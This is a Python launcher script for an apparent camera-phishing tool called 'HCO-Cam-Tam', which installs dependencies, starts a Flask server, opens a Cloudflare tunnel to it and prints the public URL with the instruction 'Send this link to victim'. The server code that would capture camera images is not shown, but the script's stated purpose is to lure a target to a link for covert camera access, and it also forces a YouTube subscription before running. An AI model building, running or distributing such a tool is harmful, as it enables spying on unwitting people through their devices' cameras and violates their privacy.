#!/usr/bin/env python3
"""
HCO-Cam-Tam
By Azhar (Hackers Colony)
"""

import os, time, subprocess
from colorama import Fore, Style

YOUTUBE = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"

def banner():
    print(Fore.RED + Style.BRIGHT + "\nHCO Cam Tam".center(60))
    print(Style.RESET_ALL + Fore.GREEN + "by Azhar - A Camera Tool\n".center(60))
    print(Style.RESET_ALL)

def unlock():
    print(Fore.YELLOW + "\n[*] Tool locked! Subscribe to unlock...\n")
    for i in range(5,0,-1):
        print(Fore.CYAN + f"Redirecting to YouTube in {i} sec...", end="\r")
        time.sleep(1)
    os.system(f"termux-open-url {YOUTUBE}")
    input(Fore.GREEN + "\n\n[+] Press ENTER after subscribing to continue...")

def install_reqs():
    print(Fore.YELLOW + "\n[*] Installing dependencies...\n")
    os.system("pip install -r requirements.txt --no-cache-dir")

def start_server():
    print(Fore.YELLOW + "\n[*] Starting Flask server...\n")
    subprocess.Popen(["python", "server.py"])
    time.sleep(3)

def start_cloudflare():
    print(Fore.YELLOW + "\n[*] Starting Cloudflare tunnel...\n")
    proc = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        if "https://" in line:
            link = line.strip().split(" ")[-1]
            print(Fore.CYAN + f"\n[+] Send this link to victim: {Fore.GREEN}{link}\n")
            break

if __name__ == "__main__":
    banner()
    unlock()
    install_reqs()
    start_server()
    start_cloudflare()
